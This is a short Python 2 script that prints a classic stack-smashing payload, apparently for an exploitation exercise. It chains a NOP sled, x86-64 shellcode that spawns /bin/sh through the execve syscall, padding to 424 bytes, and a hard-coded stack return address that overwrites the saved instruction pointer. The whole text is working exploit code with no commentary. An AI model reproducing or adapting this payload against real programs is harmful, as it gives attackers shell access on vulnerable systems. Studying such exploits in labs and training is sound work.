#!/usr/bin/python

nopsled = '\x90' * 100

buf = ""
buf += "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08"
buf += "\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"

pad = 'X' * (424 - 100 - len(buf))
rip = '\xd0\xdb\xff\xff\xff\x7f\x00\x00'

print nopsled + buf + pad + rip
